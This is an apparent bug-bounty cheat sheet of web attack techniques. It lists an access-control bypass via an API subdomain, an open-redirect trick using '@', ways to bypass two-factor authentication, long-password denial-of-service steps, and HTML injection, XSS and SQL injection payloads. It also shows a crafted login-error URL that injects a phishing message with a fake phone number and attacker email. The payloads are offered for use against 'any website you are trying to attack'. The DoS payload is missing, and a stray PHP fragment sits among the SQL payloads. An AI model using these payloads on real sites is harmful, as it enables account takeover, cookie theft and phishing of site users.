1. 401 to 200 OK
	```
	site.com/users/        -    Unauthorized
	site.com/settings/     -    Unauthorized
	site.com/reports/      -    Unauthorized
	```
	ðŸ›¡ Bypass
		```
		api.site.com/users/        -    200 OK
		api.site.com/settings/     -    200 OK
		api.site.com/reports/      -    200 OK
		```
----
2. if any site allowed redirection from limited sites then try putting @ for open redirect
	|site|method|
	|------|---|
	|http://www.example.com/?redirect=http://site.org`|DONE|
	|http://www.example.com/?redirect=http://random.org|NOT ALLOWED|
	|http://www.example.com/?redirect=http://site.org@random.org`|Bypassed|
----
3. Ways to bypass 2FA

	* Response Manipulation
    * Status code manipulation
    * 2FA code leakage in response
    * Js file analysis
    * Lack of bruteforce protection
    * Missing 2FA cise integrity validation
    * CSRF on 2FA disabling
    * Password reset disable 2FA
    * Backupcode abuse
    * Clickjacking on 2FA disabling page
    * bypass 2FA with null or 00000
----

4. Long Password Dos
    1. Go to signup page of any website you are trying to attack
    2. Type email and password and intercept the request in burpsuite
    3. Change the password you typed to

	``

	4. And forward the request and turn intercept off
	5. Now if the browser shows blank page or 400 type error
----

5. if you find a input form try 
	1. html injection 
		* `&#60;&#104;&#49;&#32;&#115;&#116;&#121;&#108;&#101;&#61;&#34;&#99;&#111;&#108;&#111;&#114;&#58;&#98;&#108;&#117;&#101;&#59;&#34;&#62;&#72;&#84;&#77;&#76;&#32;&#105;&#110;&#106;&#101;&#99;&#116;&#105;&#111;&#110;&#60;&#47;&#104;&#49;&#62;`
		* `&#85;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#58;&#60;&#98;&#114;&#62;&#10;&#60;&#105;&#110;&#112;&#117;&#116;&#32;&#116;&#121;&#112;&#101;&#61;&#34;&#116;&#101;&#120;&#116;&#34;&#32;&#110;&#97;&#109;&#101;&#61;&#34;&#102;&#105;&#114;&#115;&#116;&#110;&#97;&#109;&#101;&#34;&#62;&#10;&#60;&#98;&#114;&#62;&#10;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#58;&#60;&#98;&#114;&#62;&#10;&#60;&#105;&#110;&#112;&#117;&#116;&#32;&#116;&#121;&#112;&#101;&#61;&#34;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#34;&#32;&#110;&#97;&#109;&#101;&#61;&#34;&#108;&#97;&#115;&#116;&#110;&#97;&#109;&#101;&#34;&#62;`
	2. xss injection
		* `><script>alert(document.domain)</script><`
		* `hacker" onfocus=alert(document.cookie) autofocus "`
		* `hacker';alert(document.cookie);'`
	3. sql injection
		* `test' OR 1='1`
		* `test' OR 1='1;--`
		* ```
		foreach ($data as $i => $value) {
			[...]
			$new_keys[$key . '_' . $i] = $value;
			}
		```
		* check if url or cookie is base 64 encoded then try decoding and insert insert sql inj payload
---

6. if on false login you get https://withinsecurity.com/wp-login.php?error=accessdeniedstate=cb04a91ac5%257Chttps%253A%252F%252Fwithinsecurity.com%252Fwp-admin%252F#
	* try changing it to something like:
	 https://withinsecurity.com/wp-login.php?error=Your%20account%20has%20been%20hacked%2C%20Please%20call%20us%20this%20number%20919876543210%20OR%20Drop%20mail%20at%20attacker%40mail.com&state=cb04a91ac5%257Chttps%253A%252F%252Fwithinsecurity.com%252Fwp-admin%252F#
